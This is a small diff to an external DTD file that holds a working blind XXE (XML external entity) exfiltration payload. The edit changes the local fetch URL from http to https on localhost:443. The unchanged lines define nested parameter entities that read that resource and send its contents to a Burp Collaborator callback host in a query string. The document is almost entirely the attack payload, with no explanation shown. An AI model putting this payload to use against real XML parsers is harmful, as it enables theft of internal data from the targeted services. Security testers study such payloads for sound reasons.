@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "http://localhost:443/">
+<!ENTITY % file SYSTEM "https://localhost:443/">
 <!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://pmfvbrml53mr65e3cvxpqzk8hznxbm.burpcollaborator.net/?x=%file;'>">
 %eval;
 %exfiltrate;
